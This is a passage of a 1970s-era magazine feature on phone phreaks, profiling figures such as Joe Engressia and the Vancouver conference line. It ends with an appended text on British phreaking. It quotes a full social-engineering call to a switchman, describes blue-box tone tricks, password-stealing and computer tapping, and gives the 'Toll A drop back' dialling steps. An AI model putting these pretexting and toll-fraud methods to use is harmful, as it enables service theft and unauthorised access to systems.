Dow Jones by thirty percent.  Then imagine a voice that could make those two
sound like Stepin Fetchit.  That is sixteen-year-old Randy's voice.

He is speaking to a switchman in Detroit.  The phone company in Detroit had
closed up two toll-free loop pairs for no apparent reason, although heavy use
by phone phreaks all over the country may have been detected.  Randy is telling
the switchman how to open up the loop and make it free again:

"How are you, buddy.  Yeah. I'm on the board in here in Tulsa, Oklahoma, and
we've been trying to run some tests on your loop-arounds and we find'em busied
out on both sides.... Yeah, we've been getting a 'BY' on them, what d'ya say,
can you drop cards on 'em?  Do you have 08 on your number group?  Oh that's
okay, we've had this trouble before, we may have to go after the circuit.  Here
lemme give 'em to you: your frame is 05, vertical group 03, horizontal 5,
vertical file 3.  Yeah, we'll hang on here.... Okay, found it?  Good.  Right,
yeah, we'd like to clear that busy out.  Right.  All you have to do is look for
your key on the mounting plate, it's in your miscellaneous trunk frame.  Okay?
Right.  Now pull your key from NOR over the LCT.  Yeah. I don't know why that
happened, but we've been having trouble with that one.  Okay.  Thanks a lot
fella.  Be seein' ya."

Randy hangs up, reports that the switchman was a little inexperienced with the
loop-around circuits on the miscellaneous trunk frame, but that the loop has
been returned to its free-call status.

Delighted, phone phreak Ed returns the pair of numbers to the active-status
column in his directory.  Ed is a superb and painstaking researcher.  With
almost Talmudic thoroughness he will trace tendrils of hints through soft-wired
mazes of intervening phone-company circuitry back through complex linkages of
switching relays to find the location and identity of just one toll-free loop.
He spends hours and hours, every day, doing this sort of thing.  He has somehow
compiled a directory of eight hundred "Band-six in-WATS numbers" located in
over forty states.  Band-six in-WATS numbers are the big 800 numbers -- the
ones that can be dialed into free from anywhere in the country.

Ed the researcher, a nineteen-year-old engineering student, is also a superb
technician.  He put together his own working blue box from scratch at age
seventeen.  (He is sighted.)  This evening after distributing the latest issue
of his in-WATS directory (which has been typed into Braille for the blind phone
phreaks), he announces he has made a major new breakthrough:

"I finally tested it and it works, perfectly. I've got this switching matrix
which converts any touch-tone phone into an M-F-er."

The tones you hear in touch-tone phones are not the M-F tones that operate the
long-distance switching system.  Phone phreaks believe A.T.&T. had deliberately
equipped touch tones with a  different set of frequencies to avoid putting the
six master M-F tones in the hands of every touch-tone owner.  Ed's complex
switching matrix puts the six master tones, in effect put a blue box, in the
hands of every touch-tone owner.

Ed shows me pages of schematics, specifications and parts lists. "It's not easy
to build, but everything here is in the Heathkit catalog."

Ed asks Ralph what progress he has made in his attempts to reestablish a
long-term open conference line for phone phreaks.  The last big conference --
the historic "2111" conference -- had been arranged through an unused Telex
test-board trunk somewhere in the innards of a 4A switching machine in
Vancouver, Canada.  For months phone phreaks could M-F their way into
Vancouver, beep out 604 (the Vancouver area code) and then beep out 2111 (the
internal phone-company code for Telex testing), and find themselves at any
time, day or night, on an open wire talking with an array of phone phreaks from
coast to coast, operators from Bermuda, Tokyo and London who are phone-phreak
sympathizers, and miscellaneous guests and technical experts.  The conference
was a massive exchange of information.  Phone phreaks picked each other's
brains clean, then developed new ways to pick the phone company's brains clean.
Ralph gave M F Boogies concerts with his home-entertainment-type electric
organ, Captain Crunch demonstrated his round-the-world prowess with his
notorious computerized unit and dropped leering hints of the "action" he was
getting with his girl friends.  (The Captain lives out or pretends to live out
several kinds of fantasies to the gossipy delight of the blind phone phreaks
who urge him on to further triumphs on behalf of all of them.)  The somewhat
rowdy Northwest phone-phreak crowd let their bitter internal feud spill over
into the peaceable conference line, escalating shortly into guerrilla warfare;
Carl the East Coast international tone relations expert demonstrated newly
opened direct M-F routes to central offices on the island of Bahrein in the
Persian Gulf, introduced a new phone-phreak friend of his in Pretoria, and
explained the technical operation of the new Oakland-to Vietnam linkages.
(Many phone phreaks pick up spending money by M-F-ing calls from relatives to
Vietnam G.I.'s, charging $5 for a whole hour of trans-Pacific conversation.)

Day and night the conference line was never dead.  Blind phone phreaks all over
the country, lonely and isolated in homes filled with active sighted brothers
and sisters, or trapped with slow and unimaginative blind kids in straitjacket
schools for the blind, knew that no matter how late it got they could dial up
the conference and find instant electronic communion with two or three other
blind kids awake over on the other side of America.  Talking together on a
phone hookup, the blind phone phreaks say, is not much different from being
there together. Physically, there was nothing more than a two-inch-square wafer
of titanium inside a vast machine on Vancouver Island.  For the blind kids
>there< meant an exhilarating feeling of being in touch, through a kind of
skill and magic which was peculiarly their own.

Last April 1, however, the long Vancouver Conference was shut off. The phone
phreaks knew it was coming.  Vancouver was in the process of converting from a
step-by-step system to a 4A machine and the 2111 Telex circuit was to be wiped
out in the process.  The phone phreaks learned the actual day on which the
conference would be erased about a week ahead of time over the phone company's
internal-news-and-shop-talk recording.

For the next frantic seven days every phone phreak in America was on and off
the 2111 conference twenty-four hours a day.  Phone phreaks who were just
learning the game or didn't have M-F capability were boosted up to the
conference by more experienced phreaks so they could get a glimpse of what it
was like before it disappeared.  Top phone phreaks searched distant area codes
for new conference possibilities without success.  Finally in the early morning
of April 1, the end came.

"I could feel it coming a couple hours before midnight," Ralph remembers.  "You
could feel something going on in the lines.  Some static began showing up, then
some whistling wheezing sound.  Then there were breaks.  Some people got cut
off and called right back in, but after a while some people were finding they
were cut off and couldn't get back in at all.  It was terrible.  I lost it
about one a.m., but managed to slip in again and stay on until the thing
died... I think it was about four in the morning.  There were four of us still
hanging on when the conference disappeared into nowhere for good.  We all tried
to M-F up to it again of course, but we got silent termination.  There was
nothing there."

The Legendary Mark Bernay Turns Out To Be "The Midnight Skulker"

Mark Bernay.  I had come across that name before.  It was on Gilbertson's
select list of phone phreaks.  The California phone phreaks had spoken of a
mysterious Mark Bernay as perhaps the first and oldest phone phreak on the West
Coast.  And in fact almost every phone phreak in the West can trace his origins
either directly to Mark Bernay or to a disciple of Mark Bernay.

It seems that five years ago this Mark Bernay (a pseudonym he chose for
himself) began traveling up and down the West Coast pasting tiny stickers in
phone books all along his way.  The stickers read something like "Want to hear
an interesting tape recording? Call these numbers."  The numbers that followed
were toll-free loop-around pairs. When one of the curious called one of the
numbers he would hear a tape recording pre-hooked into the loop by Bernay which
explained the use of loop-around pairs, gave the numbers of several more, and
ended by telling the caller, "At six o'clock tonight this recording will stop
and you and your friends can try it out.  Have fun."

"I was disappointed by the response at first," Bernay told me, when I finally
reached him at one of his many numbers and he had dispensed with the usual "I
never do anything illegal" formalities which experienced phone phreaks open
most conversations.

"I went all over the coast with these stickers not only on pay phones, but I'd
throw them in front of high schools in the middle of the night, I'd leave them
unobtrusively in candy stores, scatter them on main streets of small towns.  At
first hardly anyone bothered to try it out.  I would listen in for hours and
hours after six o'clock and no one came on.  I couldn't figure out why people
wouldn't be interested.  Finally these two girls in Oregon tried it out and
told all their friends and suddenly it began to spread."

Before his Johny Appleseed trip Bernay had already gathered a sizable group of
early pre-blue-box phone phreaks together on loop-arounds in Los Angeles.
Bernay does not claim credit for the original discovery of the loop-around
numbers.  He attributes the discovery to an eighteen-year-old reform school kid
in Long Beach whose name he forgets and who, he says, "just disappeared one
day."  When Bernay himself discovered loop-arounds independently, from clues in
his readings in old issues of the Automatic Electric Technical Journal, he
found dozens of the reform-school kid's friends already using them. However, it
was one of Bernay's disciples in Seattle that introduced phone phreaking to
blind kids.  The Seattle kid who learned about loops through Bernay's recording
told a blind friend, the blind kid taught the secret to his friends at a winter
camp for blind kids in Los Angeles.  When the camp session was over these kids
took the secret back to towns all over the West.  This is how the original
blind kids became phone phreaks.  For them, for most phone phreaks in general,
it was the discovery of the possibilities of loop-arounds which led them on to
far more serious and sophisticated phone-phreak methods, and which gave them a
medium for sharing their discoveries.

A year later a blind kid who moved back east brought the technique to a blind
kids' summer camp in Vermont, which spread it along the East Coast.  All from a
Mark Bernay sticker.

Bernay, who is nearly thirty years old now, got his start when he was fifteen
and his family moved into an L.A. suburb serviced by General Telephone and
Electronics equipment.  He became fascinated with the differences between Bell
and G.T.&E. equipment.  He learned he could make interesting things happen by
carefully timed clicks with the disengage button.  He learned to interpret
subtle differences in the array of clicks, whirrs and kachinks he could hear on
his lines.  He learned he could shift himself around the switching relays of
the L.A. area code in a not-too-predictable fashion by interspersing his own
hook-switch clicks with the clicks within the line. (Independent phone
companies -- there are nineteen hundred of them still left, most of them tiny
island principalities in Ma Bell's vast empire -- have always been favorites
with phone phreaks, first as learning tools, then as Archimedes platforms from
which to manipulate the huge Bell system.  A phone phreak in Bell territory
will often M-F himself into an independent's switching system, with switching
idiosyncrasies which can give him marvelous leverage over the Bell System.

"I have a real affection for Automatic Electric Equipment," Bernay told me.
"There are a lot of things you can play with.  Things break down in interesting
ways."

Shortly after Bernay graduated from college (with a double major in chemistry
and philosophy), he graduated from phreaking around with G.T.&E. to the Bell
System itself, and made his legendary sticker-pasting journey north along the
coast, settling finally in Northwest Pacific Bell territory.  He discovered
that if Bell does not break down as interestingly as G.T.&E., it nevertheless
offers a lot of "things to play with."

Bernay learned to play with blue boxes.  He established his own personal
switchboard and phone-phreak research laboratory complex.  He continued his
phone-phreak evangelism with ongoing sticker campaigns. He set up two recording
numbers, one with instructions for beginning phone phreaks, the other with
latest news and technical developments (along with some advanced instruction)
gathered from sources all over the country.

These days, Bernay told me, he had gone beyond phone-phreaking itself. "Lately
I've been enjoying playing with computers more than playing with phones.  My
personal thing in computers is just like with phones, I guess -- the kick is in
finding out how to beat the system, how to get at things I'm not supposed to
know about, how to do things with the system that I'm not supposed to be able
to do."

As a matter of fact, Bernay told me, he had just been fired from his
computer-programming job for doing things he was not supposed to be able to do.
he had been working with a huge time-sharing computer owned by a large
corporation but shared by many others.  Access to the computer was limited to
those programmers and corporations that had been assigned certain passwords.
And each password restricted its user to access to only the one section of the
computer cordoned off from its own information storager.  The password system
prevented companies and individuals from stealing each other's information.

"I figured out how to write a program that would let me read everyone else's
password," Bernay reports.  "I began playing around with passwords.  I began
letting the people who used the computer know, in subtle ways, that I knew
their passwords.  I began dropping notes to the computer supervisors with hints
that I knew what I know. I signed them 'The Midnight Skulker.'  I kept getting
cleverer and cleverer with my messages and devising ways of showing them what I
could do. I'm sure they couldn't imagine I could do the things I was showing
them.  But they never responded to me.  Every once in a while they'd change the
passwords, but I found out how to discover what the new ones were, and I let
them know.  But they never responded directly to the Midnight Skulker.  I even
finally designed a program which they could use to prevent my program from
finding out what it did.  In effect I told them how to wipe me out, The
Midnight Skulker.  It was a very clever program.  I started leaving clues about
myself.  I wanted them to try and use it and then try to come up with something
to get around that and reappear again.  But they wouldn't play.  I wanted to
get caught.  I mean I didn't want to get caught personally, but I wanted them
to notice me and admit that they noticed me.  I wanted them to attempt to
respond, maybe in some interesting way."
Finally the computer managers became concerned enough about the threat of
information-stealing to respond.  However, instead of using The Midnight
Skulker's own elegant self-destruct program, they called in their security
personnel, interrogated everyone, found an informer to identify Bernay as The
Midnight Skulker, and fired him.

"At first the security people advised the company to hire me full-time to
search out other flaws and discover other computer freaks.  I might have liked
that.  But I probably would have turned into a double double agent rather than
the double agent they wanted.  I might have resurrected The Midnight Skulker
and tried to catch myself.  Who knows?  Anyway, the higher-ups turned the whole
idea down."

You Can Tap the F.B.I.'s Crime Control Computer in the Comfort of Your Own
Home, Perhaps

Computer freaking may be the wave of the future.  It suits the phone-phreak
sensibility perfectly.  Gilbertson, the blue-box inventor and a lifelong phone
phreak, has also gone on from phone-phreaking to computer-freaking.  Before he
got into the blue-box business Gilbertson, who is a highly skilled programmer,
devised programs for international currency arbitrage.

But he began playing with computers in earnest when he learned he could use his
blue box in tandem with the computer terminal installed in his apartment by the
instrumentation firm he worked for.  The print-out terminal and keyboard was
equipped with acoustical coupling, so that by coupling his little ivory
Princess phone to the terminal and then coupling his blue box on that, he could
M-F his way into other computers with complete anonymity, and without charge;
program and re-program them at will; feed them false or misleading information;
tap and steal from them.  He explained to me that he taps computers by busying
out all the lines, then going into a verification trunk, listening into the
passwords and instructions one of the time sharers uses, and them M-F-ing in
and imitating them.  He believes it would not be impossible to creep into the
F.B.I's crime control computer through a local police computer terminal and
phreak around with the F.B.I.'s memory banks.  He claims he has succeeded in
re-programming a certain huge institutional computer in such a way that it has
cordoned off an entire section of its circuitry for his personal use, and at
the same time conceals that arrangement from anyone else's notice.  I have been
unable to verify this claim.

Like Captain Crunch, like Alexander Graham Bell (pseudonym of a
disgruntled-looking East Coast engineer who claims to have invented the black
box and now sells black and blue boxes to gamblers and radical heavies), like
most phone phreaks, Gilbertson began his career trying to rip off pay phones as
a teenager.  Figure them out, then rip them off.  Getting his dime back from
the pay phone is the phone phreak's first thrilling rite of passage.  After
learning the usual eighteen different ways of getting his dime back, Gilbertson
learned how to make master keys to coin-phone cash boxes, and get everyone
else's dimes back.  He stole some phone-company equipment and put together his
own home switchboard with it.  He learned to make a simple "bread-box" device,
of the kind used by bookies in the Thirties (bookie gives a number to his
betting clients; the phone with that number is installed in some widow lady's
apartment, but is rigged to ring in the bookie's shop across town, cops trace
big betting number and find nothing but the widow).

Not long after that afternoon in 1968 when, deep in the stacks of an
engineering library, he came across a technical journal with the phone tone
frequencies and rushed off to make his first blue box, not long after that
Gilbertson abandoned a very promising career in physical chemistry and began
selling blue boxes for $1,500 apiece.

"I had to leave physical chemistry.  I just ran out of interesting things to
learn," he told me one evening.  We had been talking in the apartment of the
man who served as the link between Gilbertson and the syndicate in arranging
the big $300,000 blue-box deal which fell through because of legal trouble.
There has been some smoking.

"No more interesting things to learn," he continues.  "Physical chemistry turns
out to be a sick subject when you take it to its highest level.  I don't know.
I don't think I could explain to you how it's sick.  You have to be there.  But
you get, I don't know, a false feeling of omnipotence.  I suppose it's like
phone-phreaking that way.  This huge thing is there.  This whole system.  And
there are holes in it and you slip into them like Alice and you're pretending
you're doing something you're actually not, or at least it's no longer you
that's doing what you thought you were doing.  It's all Lewis Carroll.
Physical chemistry and phone-phreaking.  That's why you have these phone-phreak
pseudonyms like The Cheshire Cat, the Red King, and The Snark.  But there's
something about phone-phreaking that you don't find in physical chemistry."  He
looks up at me:

"Did you ever steal anything?"

"Well yes, I..."

"Then you know!  You know the rush you get.  It's not just knowledge, like
physical chemistry.  It's forbidden knowledge.  You know.  You can learn about
anything under the sun and be bored to death with it. But the idea that it's
illegal.  Look: you can be small and mobile and smart and you're ripping off
somebody large and powerful and very dangerous."

People like Gilbertson and Alexander Graham Bell are always talking about
ripping off the phone company and screwing Ma Bell.  But if they were shown a
single button and told that by pushing it they could turn the entire circuitry
of A.T.&T. into molten puddles, they probably wouldn't push it.  The
disgruntled-inventor phone phreak needs the phone system the way the lapsed
Catholic needs the Church, the way Satan needs a God, the way The Midnight
Skulker needed, more than anything else, response.

Later that evening Gilbertson finished telling me how delighted he was at the
flood of blue boxes spreading throughout the country, how delighted he was to
know that "this time they're really screwed."  He suddenly shifted gears.

"Of course.  I do have this love/hate thing about Ma Bell.  In a way I almost
like the phone company.  I guess I'd be very sad if they were to disintegrate.
In a way it's just that after having been so good they turn out to have these
things wrong with them.  It's those flaws that allow me to get in and mess with
them, but I don't know.  There's something about it that gets to you and makes
you want to get to it, you know."

I ask him what happens when he runs out of interesting, forbidden things to
learn about the phone system.

"I don't know, maybe I'd go to work for them for a while."

"In security even?"

"I'd do it, sure.  I just as soon play -- I'd just as soon work on either
side."

"Even figuring out how to trap phone phreaks? I said, recalling Mark Bernay's
game."

"Yes, that might be interesting.  Yes, I could figure out how to outwit the
phone phreaks.  Of course if I got too good at it, it might become boring
again.  Then I'd have to hope the phone phreaks got much better and outsmarted
me for a while.  That would move the quality of the game up one level.  I might
even have to help them out, you know, 'Well, kids, I wouldn't want this to get
around but did you ever think of -- ?' I could keep it going at higher and
higher levels forever."

The dealer speaks up for the first time.  He has been staring at the soft
blinking patterns of light and colors on the translucent tiled wall facing him.
(Actually there are no patterns: the color and illumination of every tile is
determined by a computerized random-number generator designed by Gilbertson
which insures that there can be no meaning to any sequence of events in the
tiles.)

"Those are nice games you're talking about," says the dealer to his friend.
"But I wouldn't mind seeing them screwed.  A telephone isn't private anymore.
You can't say anything you really want to say on a telephone or you have to go
through that paranoid bullshit.  'Is it cool to talk on the phone?' I mean,
even if it is cool, if you have to ask 'Is it cool,' then it isn't cool.  You
know.  'Is it cool,' then it isn't cool.  You know.  Like those blind kids,
people are going to start putting together their own private telephone
companies if they want to really talk.  And you know what else.  You don't hear
silences on the phone anymore.  They've got this time-sharing thing on
long-distance lines where you make a pause and they snip out that piece of time
and use it to carry part of somebody else's conversation.  Instead of a pause,
where somebody's maybe breathing or sighing, you get this blank hole and you
only start hearing again when someone says a word and even the beginning of the
word is clipped off. Silences don't count -- you're paying for them, but they
take them away from you.  It's not cool to talk and you can't hear someone when
they don't talk.  What the hell good is the phone?  I wouldn't mind seeing them
totally screwed."

The Big Memphis Bust

Joe Engressia never wanted to screw Ma Bell.  His dream had always been to work
for her.

The day I visited Joe in his small apartment on Union Avenue in Memphis, he was
upset about another setback in his application for a telephone job.

"They're stalling on it.  I got a letter today telling me they'd have to
postpone the interview I requested again.  My landlord read it for me.  They
gave me some runaround about wanting papers on my rehabilitation status but I
think there's something else going on."

When I switched on the 40-watt bulb in Joe's room -- he sometimes forgets when
he has guests -- it looked as if there was enough telephone hardware to start a
small phone company of his own.

There is one phone on top of his desk, one phone sitting in an open drawer
beneath the desk top.  Next to the desk-top phone is a cigar-box-size M-F
device with big toggle switches, and next to that is some kind of switching and
coupling device with jacks and alligator plugs hanging loose.  Next to that is
a Braille typewriter.  On the floor next to the desk, lying upside down like a
dead tortoise, is the half-gutted body of an old black standard phone.  Across
the room on a torn and dusty couch are two more phones, one of them a
touch-tone model; two tape recorders; a heap of phone patches and cassettes,
and a life-size toy telephone.

Our conversation is interrupted every ten minutes by phone phreaks from all
over the country ringing Joe on just about every piece of equipment but the toy
phone and the Braille typewriter.  One fourteen-year-old blind kid from
Connecticut calls up and tells Joe he's got a girl friend.  He wants to talk to
Joe about girl friends. Joe says they'll talk later in the evening when they
can be alone on the line.  Joe draws a deep breath, whistles him off the air
with an earsplitting 2600-cycle whistle. Joe is pleased to get the calls but he
looked worried and preoccupied that evening, his brow constantly furrowed over
his dark wandering eyes.  In addition to the phone-company stall, he has just
learned that his apartment house is due to be demolished in sixty days for
urban renewal.  For all its shabbiness, the Union Avenue apartment house has
been Joe's first home-of-his-own and he's worried that he may not find another
before this one is demolished.

But what really bothers Joe is that switchmen haven't been listening to him.
"I've been doing some checking on 800 numbers lately, and I've discovered that
certain 800 numbers in New Hampshire couldn't be reached from Missouri and
Kansas.  Now it may sound like a small thing, but I don't like to see sloppy
work; it makes me feel bad about the lines.  So I've been calling up switching
offices and reporting it, but they haven't corrected it.  I called them up for
the third time today and instead of checking they just got mad.  Well, that
gets me mad.  I mean, I do try to help them.  There's something about them I
can't understand -- you want to help them and they just try to say you're
defrauding them."

It is Sunday evening and Joe invites me to join him for dinner at a Holiday
Inn.  Frequently on Sunday evening Joe takes some of his welfare money, calls a
cab, and treats himself to a steak dinner at one of Memphis' thirteen Holiday
Inns.  (Memphis is the headquarters of Holiday Inn.  Holiday Inns have been a
favorite for Joe ever since he made his first solo phone trip to a Bell
switching office in Jacksonville, Florida, and stayed in the Holiday Inn there.
He likes to stay at Holiday Inns, he explains, because they represent freedom
to him and because the rooms are arranged the same all over the country so he
knows that any Holiday Inn room is familiar territory to him.  Just like any
telephone.)

Over steaks in the Pinnacle Restaurant of the Holiday Inn Medical Center on
Madison Avenue in Memphis, Joe tells me the highlights of his life as a phone
phreak.

At age seven, Joe learned his first phone trick.  A mean baby-sitter, tired of
listening to little Joe play with the phone as he always did, constantly, put a
lock on the phone dial.  "I got so mad.  When there's a phone sitting there and
I can't use it... so I started getting mad and banging the receiver up and
down.  I noticed I banged it once and it dialed one.  Well, then I tried
banging it twice...." In a few minutes Joe learned how to dial by pressing the
hook switch at the right time.  "I was so excited I remember going 'whoo whoo'
and beat a box down on the floor."

At age eight Joe learned about whistling.  "I was listening to some intercept
non working-number recording in L.A.- I was calling L.A. as far back as that,
but I'd mainly dial non working numbers because there was no charge, and I'd
listen to these recordings all day.  Well, I was whistling 'cause listening to
these recordings can be boring after a while even if they are from L.A., and
all of a sudden, in the middle of whistling, the recording clicked off.  I
fiddled around whistling some more, and the same thing happened.  So I called
up the switch room and said, 'I'm Joe.  I'm eight years old and I want to know
why when I whistle this tune the line clicks off.'  He tried to explain it to
me, but it was a little too technical at the time.  I went on learning.  That
was a thing nobody was going to stop me from doing. The phones were my life,
and I was going to pay any price to keep on learning.  I knew I could go to
jail.  But I had to do what I had to do to keep on learning."

The phone is ringing when we walk back into Joe's apartment on Union Avenue.
It is Captain Crunch.  The Captain has been following me around by phone,
calling up everywhere I go with additional bits of advice and explanation for
me and whatever phone phreak I happen to be visiting.  This time the Captain
reports he is calling from what he describes as "my hideaway high up in the
Sierra Nevada."  He pulses out lusty salvos of M-F and tells Joe he is about to
"go out and get a little action tonight.  Do some phreaking of another kind, if
you know what I mean."  Joe chuckles.

The Captain then tells me to make sure I understand that what he told me about
tying up the nation's phone lines was true, but that he and the phone phreaks
he knew never used the technique for sabotage.  They only learned the technique
to help the phone company.

"We do a lot of troubleshooting for them.  Like this New Hampshire/Missouri
WATS-line flaw I've been screaming about.  We help them more than they know."

After we say good-bye to the Captain and Joe whistles him off the line, Joe
tells me about a disturbing dream he had the night before: "I had been caught
and they were taking me to a prison.  It was a long trip.  They were taking me
to a prison a long long way away.  And we stopped at a Holiday Inn and it was
my last night ever using the phone and I was crying and crying, and the lady at
the Holiday Inn said, 'Gosh, honey, you should never be sad at a Holiday Inn.
You should always be happy here.  Especially since it's your last night.'  And
that just made it worse and I was sobbing so much I couldn't stand it."

Two weeks after I left Joe Engressia's apartment, phone-company security agents
and Memphis police broke into it.  Armed with a warrant, which they left pinned
to a wall, they confiscated every piece of equipment in the room, including his
toy telephone.  Joe was placed under arrest and taken to the city jail where he
was forced to spend the night since he had no money and knew no one in Memphis
to call.

It is not clear who told Joe what that night, but someone told him that the
phone company had an open-and-shut case against him because of revelations of
illegal activity he had made to a phone-company undercover agent.

By morning Joe had become convinced that the reporter from Esquire, with whom
he had spoken two weeks ago, was the undercover agent.  He probably had ugly
thoughts about someone he couldn't see gaining his confidence, listening to him
talk about his personal obsessions and dreams, while planning all the while to
lock him up.

"I really thought he was a reporter," Engressia told the Memphis Press-Seminar.
"I told him everything...." Feeling betrayed, Joe proceeded to confess
everything to the press and police.

As it turns out, the phone company did use an undercover agent to trap Joe,
although it was not the Esquire reporter.

Ironically, security agents were alerted and began to compile a case against
Joe because of one of his acts of love for the system: Joe had called an
internal service department to report that he had located a group of defective
long-distance trunks, and to complain again about the New Hampshire/Missouri
WATS problem.  Joe always liked Ma Bell's lines to be clean and responsive.  A
suspicious switchman reported Joe to the security agents who discovered that
Joe had never had a long-distance call charged to his name.

Then the security agents learned that Joe was planning one of his phone trips
to a local switching office.  The security people planted one of their agents
in the switching office.  He posed as a student switchman and followed Joe
around on a tour.  He was extremely friendly and helpful to Joe, leading him
around the office by the arm. When the tour was over he offered Joe a ride back
to his apartment house.  On the way he asked Joe -- one tech man to another --
about "those blue boxers" he'd heard about.  Joe talked about them freely,
talked about his blue box freely, and about all the other things he could do
with the phones.

The next day the phone-company security agents slapped a monitoring tape on
Joe's line, which eventually picked up an illegal call.  Then they applied for
the search warrant and broke in.

In court Joe pleaded not guilty to possession of a blue box and theft of
service.  A sympathetic judge reduced the charges to malicious mischief and
found him guilty on that count, sentenced him to two thirty-day sentences to be
served concurrently and then suspended the sentence on condition that Joe
promise never to play with phones again.  Joe promised, but the phone company
refused to restore his service.  For two weeks after the trial Joe could not be
reached except through the pay phone at his apartment house, and the landlord
screened all calls for him.

Phone-phreak Carl managed to get through to Joe after the trial, and reported
that Joe sounded crushed by the whole affair.

"What I'm worried about," Carl told me, "is that Joe means it this time.  The
promise.  That he'll never phone-phreak again.  That's what he told me, that
he's given up phone-phreaking for good.  I mean his entire life.  He says he
knows they're going to be watching him so closely for the rest of his life
he'll never be able to make a move without going straight to jail.  He sounded
very broken up by the whole experience of being in jail. It was awful to hear
him talk that way.  I don't know.  I hope maybe he had to sound that way.  Over
the phone, you know."

He reports that the entire phone-phreak underground is up in arms over the
phone company's treatment of Joe.  "All the while Joe had his hopes pinned on
his application for a phone-company job, they were stringing him along getting
ready to bust him.  That gets me mad.  Joe spent most of his time helping them
out.  The bastards.  They think they can use him as an example.  All of sudden
they're harassing us on the coast.  Agents are jumping up on our lines.  They
just busted ------'s mute yesterday and ripped out his lines.  But no matter
what Joe does, I don't think we're going to take this lying down."

Two weeks later my phone rings and about eight phone phreaks in succession say
hello from about eight different places in the country, among them Carl, Ed,
and Captain Crunch.  A nationwide phone-phreak conference line has been
reestablished through a switching machine in --------, with the cooperation of
a disgruntled switchman.

"We have a special guest with us today," Carl tells me.

The next voice I hear is Joe's.  He reports happily that he has just moved to a
place called Millington, Tennessee, fifteen miles outside of Memphis, where he
has been hired as a telephone-set repairman by a small independent phone
company.  Someday he hopes to be an equipment troubleshooter.

"It's the kind of job I dreamed about.  They found out about me from the
publicity surrounding the trial.  Maybe Ma Bell did me a favor busting me.
I'll have telephones in my hands all day long."

"You know the expression, 'Don't get mad, get even'?" phone-phreak Carl asked
me.  "Well, I think they're going to be very sorry about what they did to Joe
and what they're trying to do to us."

  IN BRITAIN, PHREAKING GOES BACK TO THE EARLY FIFTIES, WHEN THE TECHNIQUE OF
'TOLL A DROP BACK' WAS DISCOVERED.  TOLL A WAS AN EXCHANGE NEAR ST.  PAULS
WHICH ROUTED CALLS BETWEEN LONDON AND NEARBY NON-LONDON EXCHANGES.  THE TRICK
WAS TO DIAL AN UNALLOCATED NUMBER, AND THEN DEPRESS THE RECEIVER-REST FOR 1/2
SECOND.  THIS FLASHING INITIATED THE 'CLEAR FORWARD' SIGNAL, LEAVING THE CALLER
WITH AN OPEN LINE INTO THE TOLL A EXCHANGE.THE COULD THEN DIAL 018, WHICH
FORWARDED HIM TO THE TRUNK EXCHANGE AT THAT TIME, THE FIRST LONG DISTANCE
EXCHANGE IN BRITAIN AND FOLLOW IT WITH THE CODE FOR THE DISTANT EXCHANGE TO
WHICH HE WOULD BE CONNECTED AT NO EXTRA CHARGE.

  THE SIGNALS NEEDED TO CONTROL THE UK NETWORK TODAY WERE PUBLISHED IN THE
"INSTITUTION OF POST OFFICE ENGINEERS JOURNAL" AND REPRINTED IN THE SUNDAY
TIMES (15 OCT.  1972).

  THE SIGNALLING SYSTEM THEY USE:  SIGNALLING SYSTEM NO.  3 USES PAIRS OF
FREQUENCIES SELECTED FROM 6 TONES SEPARATED BY 120HZ.  WITH THAT INFO, THE
PHREAKS MADE "BLEEPERS" OR AS THEY ARE CALLED HERE IN THE U.S.  "BLUE BOX", BUT
THEY DO UTILIZE DIFFERENT MF TONES THEN THE U.S., THUS, YOUR U.S.  BLUE BOX
THAT YOU SMUGGLED INTO THE UK WILL NOT WORK, UNLESS YOU CHANGE THE
FREQUENCIES.

  IN THE EARLY SEVENTIES, A SIMPLER SYSTEM BASED ON DIFFERENT NUMBERS OF PULSES
WITH THE SAME FREQUENCY (2280HZ) WAS USED.  FOR MORE INFO ON THAT, TRY TO GET A
HOLD OF:  ATKINSON'S "TELEPHONY AND SYSTEMS TECHNOLOGY".

  IN THE EARLY DAYS OF BRITISH PHREAKING, THE CAMBRIDGE UNIVERSITY TITAN
COMPUTER WAS USED TO RECORD AND CIRCULATE NUMBERS FOUND BY THE EXHAUSTIVE
DIALING OF LOCAL NETWORKS.  THESE NUMBERS WERE USED TO CREATE A CHAIN OF LINKS
FROM LOCAL EXCHANGE TO LOCAL EXCHANGE ACROSS THE COUNTRY, BYPASSING THE TRUNK
CIRCUITS.  BECAUSE THE INTERNAL ROUTING CODES IN THE UK NETWORK ARE NOT THE
SAME AS THOSE DIALED BY THE CALLER, THE PHREAKS HAD TO DISCOVER THEM BY 'PROBE
AND LISTEN' TECHNIQUES OR MORE COMMONLY KNOWN IN THE U.S.-- SCANNING.  WHAT
THEY DID WAS PUT IN LIKELY SIGNALS AND LISTENED TO FIND OUT IF THEY SUCCEEDED.
THE RESULTS OF SCANNING WERE CIRCULATED TO OTHER PHREAKS. DISCOVERING EACH
OTHER TOOK TIME AT FIRST, BUT EVENTUALLY THE PHREAKS BECAME ORGANIZED.  THE
"TAP" OF BRITAIN WAS CALLED "UNDERCURRENTS" WHICH ENABLED BRITISH PHREAKS TO
SHARE THE INFO ON NEW NUMBERS, EQUIPMENT ETC.

  TO UNDERSTAND WHAT THE BRITISH BRITISH PHREAKS DID, THINK OF THE PHONE
NETWORK IN THREE LAYERS OF LINES:  LOCAL, TRUNK, AND INTERNATIONAL.#IN THE UK,
SUBSCRIBER TRUNK DIALING (STD), IS THE MECHANISM WHICH TAKES A CALL FROM THE
LOCAL LINES AND (LEGITIMATELY) ELEVATES IT TO A TRUNK OR INTERNATIONAL
LEVEL.#THE UK PHREAKS FIGURED THAT A CALL AT TRUNK LEVEL CAN BE ROUTED THROUGH
ANY NUMBER OF EXCHANGES, PROVIDED THAT THE RIGHT ROUTING CODES WERE FOUND AND
USED CORRECTLY.  THEY ALSO HAD TO DISCOVER HOW TO GET FROM LOCAL TO TRUNK LEVEL
EITHER WITHOUT BEING CHARGED (WHICH THEY DID WITH A BLEEPER BOX) OR WITHOUT
USING (STD).  CHAINING HAS ALREADY BEEN MENTIONED BUT IT REQUIRES LONG STRINGS
OF DIGITS AND SPEECH GETS MORE AND MORE FAINT AS THE CHAIN GROWS, JUST LIKE IT
DOES WHEN YOU STACK TRUNKS BACK AND FORTH ACROSS THE U.S.#THE WAY THE SECURITY
REPS SNAGGED THE PHREAKS WAS TO PUT A SIMPLE 'PRINTERMETER' OR AS WE CALL IT:
A PEN REGISTER ON THE SUSPECTS LINE, WHICH SHOWS EVERY DIGIT DIALED FROM THE
SUBSCRIBERS LINE.

